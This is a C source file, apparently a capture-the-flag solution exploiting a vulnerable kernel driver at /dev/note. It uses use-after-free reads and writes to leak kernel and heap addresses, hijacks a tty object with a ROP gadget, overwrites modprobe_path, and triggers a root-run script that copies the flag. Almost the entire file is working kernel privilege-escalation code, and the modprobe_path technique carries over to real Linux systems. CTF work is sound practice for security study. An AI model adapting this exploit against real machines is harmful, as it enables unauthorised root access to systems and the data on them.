#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <sys/syscall.h>

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

typedef struct {
    long size;
    long index;
    char *buffer;
} note_data;

#define CMD_ALLOCATE 0x1001
#define CMD_VIEW 0x1002
#define CMD_EDIT 0x1003
#define CMD_DELETE 0x1004

#define kaslr_offset 0x545810
#define modprobe_path 0x1dd3b20
#define rop 0x4c08c0 // xchg dword ptr [rdx + 0x4c], esi ; ret

int main() {
    // Set CPU affinity to make sure heap allocations won't spread over different CPUs
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
    {
        perror("sched_setaffinity");
        return -1;
    }

    int fd = open("/dev/note", O_RDWR);
    if (fd == -1) {
        perror("open");
        return -1;
    }
    void *mem = malloc(256);
    uint64_t *mem_64 = (uint64_t *)mem;
    memset(mem, -1, 256);
    note_data data;
    data.size = 256;
    data.buffer = mem;
    data.index = 1;
    for (int i = 0; i < 2; ++i)
        ioctl(fd, CMD_ALLOCATE, 256);
    
    // leak kaslr
    ioctl(fd, CMD_EDIT, &data);
    ioctl(fd, CMD_DELETE, 1);

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    struct itimerspec ts;
    ts.it_interval.tv_sec = 0;
    ts.it_interval.tv_nsec = 0;
    ts.it_value.tv_sec = 10000 / 1000;
    ts.it_value.tv_nsec = (10000 % 1000) * 1000000;
    timerfd_settime(tfd, 0, &ts, NULL);

    ioctl(fd, CMD_VIEW, &data); 
    DumpHex(mem, 256);
    uint64_t kaslr = mem_64[5] - kaslr_offset;
    uint64_t kheap = mem_64[19] - 0x90;
    printf("[+] kaslr: 0x%lx\n", kaslr);
    printf("[+] kheap: 0x%lx\n", kheap);

    close(tfd);

    void *mem2 = malloc(0x20);
    uint64_t *mem2_64 = (uint64_t *)mem2;
    memset(mem2, 0, 0x20);
    note_data data2;
    data2.size = 0x20;
    data2.buffer = mem2;
    data2.index = 3;
    for (int i = 0; i < 2; ++i)
        ioctl(fd, CMD_ALLOCATE, 0x20);

    ioctl(fd, CMD_EDIT, &data2);
    ioctl(fd, CMD_DELETE, 3);

    int pfd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

    ioctl(fd, CMD_VIEW, &data2); 
    DumpHex(mem2, 0x20);
    uint64_t orig_tty = mem2_64[0];
    mem2_64[0] = kheap;

    memset(mem, 0, 256);
    mem_64[2] = kheap;
    mem_64[4] = kheap;
    mem_64[12] = kaslr + rop;

    ioctl(fd, CMD_EDIT, &data);
    ioctl(fd, CMD_EDIT, &data2);

    char path[12];
    memset(path, 0, sizeof(path));
    strcpy(path, "/home/ctf/x");
    ioctl(pfd, *(uint32_t*)path, kaslr + modprobe_path - 0x4c);
    ioctl(pfd, *(uint32_t*)&path[4], kaslr + modprobe_path - 0x4c + 4);
    ioctl(pfd, *(uint32_t*)&path[8], kaslr + modprobe_path - 0x4c + 8);

    mem2_64[0] = orig_tty;
    ioctl(fd, CMD_EDIT, &data2);

    system("echo -ne \"\xff\xff\xff\xff\" > /home/ctf/y");
    system("echo -ne \"#!/bin/sh\ncp /flag /home/ctf/flag; chmod 777 /home/ctf/flag\" > /home/ctf/x");
    system("chmod +x /home/ctf/x /home/ctf/y");
    system("/home/ctf/y");
    system("cat /home/ctf/flag");
}